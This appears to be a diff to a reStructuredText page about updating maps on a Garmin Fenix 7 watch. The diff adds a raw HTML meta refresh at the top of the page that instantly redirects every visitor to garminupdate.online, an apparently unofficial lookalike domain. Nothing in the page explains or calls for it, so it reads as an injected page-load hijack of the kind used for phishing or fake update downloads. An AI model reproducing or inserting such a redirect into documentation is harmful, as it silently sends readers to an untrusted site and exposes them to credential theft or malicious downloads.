@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
 Garmin Fenix 7 Map Update: How to Keep Your Adventure Maps Current
 =====================================================
 
